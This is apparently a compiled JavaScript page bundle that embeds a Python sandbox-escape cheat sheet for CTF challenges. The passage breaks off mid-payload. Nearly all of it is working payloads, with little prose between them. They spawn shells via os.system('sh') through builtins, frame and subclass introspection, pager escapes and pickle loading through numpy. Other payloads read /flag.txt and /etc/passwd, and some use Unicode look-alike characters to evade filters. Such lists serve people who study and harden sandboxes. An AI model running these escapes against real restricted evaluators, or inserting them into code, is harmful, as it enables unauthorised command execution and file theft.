import{S as lw,i as uw,s as kw,C as K_,w as rw,x as iw,y as _w,z as dw,A as Mg,f as fw,t as mw,B as bw,Y as Bg,l as p,r,a as u,m as t,n as o,u as i,h as n,c as k,p as l,b as c,J as a,E as yw}from"../../chunks/index-f2a82808.js";import{L as gw}from"../../chunks/layout-d6e193e1.js";import"../../chunks/utils-e126d158.js";function ww(Wa){let d,w,A,S,_,m,Ya,ec,$,Ga,rk,cc,J,qg=`<code class="language-py"><span class="token comment"># obtain builtins from a globally defined built-in functions</span>
<span class="token comment"># https://docs.python.org/3/library/functions.html</span>
<span class="token keyword">print</span><span class="token punctuation">.</span>__self__
__build_class__<span class="token punctuation">.</span>__self__
<span class="token builtin">__import__</span><span class="token punctuation">.</span>__self__

<span class="token comment"># obtain builtins from site-module constants</span>
<span class="token comment"># https://docs.python.org/3/library/constants.html#constants-added-by-the-site-module</span>
<span class="token builtin">help</span><span class="token punctuation">.</span>__call__<span class="token punctuation">.</span>__builtins__ <span class="token comment"># or __globals__</span>
<span class="token builtin">help</span><span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span> <span class="token comment"># can chain with sys.modules</span>
license<span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__builtins__ <span class="token comment"># or __globals__</span>
license<span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span> <span class="token comment"># can chain with sys.modules</span>

<span class="token comment"># obtain the builtins from a defined function</span>
func<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>
<span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__globals__

<span class="token comment"># obtain builtins from generators</span>
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_builtins
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span>
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_builtins
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span></code>`,lc,K,Va,ik,uc,Z,zg=`<code class="language-py">breakpoint<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># pdb -> import os; os.system("sh")</span>
<span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># import os; os.system("sh")</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># __import__("os").system("sh")</span>

<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># less pager -> !/bin/sh</span>
<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># less pager -> :e/flag.txt</span>

<span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span> <span class="token punctuation">[</span> <span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span>
<span class="token comment"># to stderr</span>
<span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">float</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"/flag.txt"</span><span class="token punctuation">,</span><span class="token string">"exec"</span><span class="token punctuation">)</span>
<span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># to stdout</span>
<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span>

<span class="token comment"># https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#read-file-with-builtins-help-and-license</span>
license<span class="token punctuation">.</span>_Printer__filenames <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'/flag.txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> license<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># [license() for license._Printer__filenames in [['/flag.txt']]]</span></code>`,kc,X,$a,_k,rc,Q,Wg=`<code class="language-py"><span class="token comment"># &lt;class '_frozen_importlib.BuiltinImporter'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># &lt;class '_frozen_importlib_external.FileLoader'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"/flag.txt"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class '_io._IOBase'> -> &lt;class '_io._RawIOBase'> -> &lt;class '_io.FileIO'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">111</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'os._wrap_close'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">.</span>close<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'subprocess.Popen'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">262</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"cat"</span><span class="token punctuation">,</span><span class="token string">"/flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token comment"># &lt;class 'abc.ABC'> -> &lt;class 'abc.ABCMeta'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'collections.Counter'></span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>copy<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>update<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'generator'> - instance</span>
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__loader__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'async_generator'> - instance</span>
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span><span class="token string">"_loader_"</span><span class="token string">"_"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span><span class="token string">"_builtins_"</span><span class="token string">"_"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token string">"_import_"</span><span class="token string">"_('os').system('sh')"</span><span class="token punctuation">)</span></code>`,ic,ss,Ja,dk,_c,ns,Yg=`<code class="language-py"><span class="token comment"># sys</span>
sys <span class="token operator">=</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"sys"</span><span class="token punctuation">)</span>
io <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">.</span>__self__<span class="token punctuation">;</span> sys <span class="token operator">=</span> io<span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"sys"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
builtins <span class="token operator">=</span> <span class="token keyword">print</span><span class="token punctuation">.</span>__self__<span class="token punctuation">;</span> sys <span class="token operator">=</span> builtins<span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>create_module<span class="token punctuation">(</span><span class="token punctuation">[</span>builtins<span class="token punctuation">.</span>__spec__ <span class="token keyword">for</span> builtins<span class="token punctuation">.</span>__spec__<span class="token punctuation">.</span>name <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"module_name"</span><span class="token punctuation">]</span> <span class="token comment"># contains most of the builtin modules alongside frozen imports (https://docs.python.org/3/library/index.html)</span>
sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
sys<span class="token punctuation">.</span>breakpointhook<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># same as breakpoint()</span>
sys<span class="token punctuation">.</span>_getframe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># _io</span>
io <span class="token operator">=</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"_io"</span><span class="token punctuation">)</span>
io <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">.</span>__self__

io<span class="token punctuation">.</span>FileIO<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>raw<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># numpy</span>
numpy<span class="token punctuation">.</span>fromfile<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>numpy<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span>
numpy<span class="token punctuation">.</span>rec<span class="token punctuation">.</span>fromfile<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">,</span> formats<span class="token operator">=</span><span class="token string">"i1"</span><span class="token punctuation">)</span>
numpy<span class="token punctuation">.</span>loadtxt<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span> <span class="token comment"># stderr</span>

numpy<span class="token punctuation">.</span>savetxt<span class="token punctuation">(</span><span class="token string">"/tmp/exp"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"\x80\x95\0\0\0\0\0\0\0\x8Cos\x8Csystem\x93\x94\x94h\x8Csh\x85R."</span><span class="token punctuation">]</span><span class="token punctuation">,</span> fmt<span class="token operator">=</span><span class="token string">'%s'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"latin-1"</span><span class="token punctuation">)</span> <span class="token comment"># any pickle to execute, ie: &#96;pickora -c 'from os import system; system("sh")'&#96;</span>
numpy<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"/tmp/exp"</span><span class="token punctuation">,</span> allow_pickle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token comment"># https://numpy.org/doc/stable/reference/generated/numpy.load.html</span></code>`,dc,as,Ka,fk,fc,ps,Za,mk,mc,ts,Gg=`<code class="language-py"><span class="token decorator annotation punctuation">@exec</span>
<span class="token decorator annotation punctuation">@input</span>
<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment"># or class a:pass</span>

<span class="token decorator annotation punctuation">@print</span>
<span class="token decorator annotation punctuation">@set</span>
<span class="token decorator annotation punctuation">@open</span>
<span class="token decorator annotation punctuation">@input</span>
<span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token decorator annotation punctuation">@print</span>&#92;r@<span class="token builtin">set</span>&#92;r@<span class="token builtin">open</span>&#92;r@<span class="token builtin">input</span>&#92;rclass\\x0ca<span class="token punctuation">:</span><span class="token keyword">pass</span></code>`,bc,os,Xa,bk,yc,es,Vg=`<code class="language-py"><span class="token comment"># https://lingojam.com/ItalicTextGenerator</span>

<span class="token comment"># no ASCII</span>
\u{1D623}\u{1D633}\u{1D626}\u{1D622}\u{1D62C}\u{1D631}\u{1D630}\u{1D62A}\u{1D62F}\u{1D635}<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># import os;os.system("/bin/sh")</span>

<span class="token comment"># no ASCII letters, no double underscores, inside eval</span>
_\uFF3F\u{1D62A}\u{1D62E}\u{1D631}\u{1D630}\u{1D633}\u{1D635}\uFF3F_<span class="token punctuation">(</span>\u{1D62A}\u{1D62F}\u{1D631}\u{1D636}\u{1D635}<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span>\u{1D62A}\u{1D62F}\u{1D631}\u{1D636}\u{1D635}<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># double underscore bypass by having underscore + unicode underscore (https://www.compart.com/en/unicode/U+005F) -> U+FE33, U+FE34, U+FE4D, U+FE4E, U+FE4F, U+FF3F</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, inside eval</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D62E}\u{1D633}\u{1D630}\uFF3F_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\u{1D62D}\u{1D630}\u{1D622}\u{1D625}_\u{1D62E}\u{1D630}\u{1D625}\u{1D636}\u{1D62D}\u{1D626}<span class="token punctuation">(</span><span class="token string">"\\157\\163"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span><span class="token string">"\\57\\142\\151\\156\\57\\163\\150"</span><span class="token punctuation">)</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, no quotes/double quotes inside eval (>= python3.8)</span>
<span class="token punctuation">[</span>\u{1D63A}<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">,</span>\u{1D622}<span class="token operator">:=</span>y<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D62E}\u{1D633}\u{1D630}\uFF3F_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\u{1D62D}\u{1D630}\u{1D622}\u{1D625}_\u{1D62E}\u{1D630}\u{1D625}\u{1D636}\u{1D62D}\u{1D626}<span class="token punctuation">(</span>\u{1D63A}<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token operator">+</span>\u{1D622}<span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span>\u{1D622}<span class="token operator">+</span>\u{1D63A}<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, no quotes/double quotes, no square brackets inside eval (>= python3.8)</span>
<span class="token punctuation">(</span>\u{1D625}<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">,</span>d<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F<span class="token builtin">dir</span>\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span>\u{1D634}<span class="token operator">:=</span>\u{1D625}<span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\u{1D625}<span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D62E}\u{1D633}\u{1D630}\uFF3F_<span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D62D}\u{1D630}\u{1D622}\u{1D625}_\u{1D62E}\u{1D630}\u{1D625}\u{1D636}\u{1D62D}\u{1D626}<span class="token punctuation">(</span>\u{1D625}<span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token operator">+</span>\u{1D634}<span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token 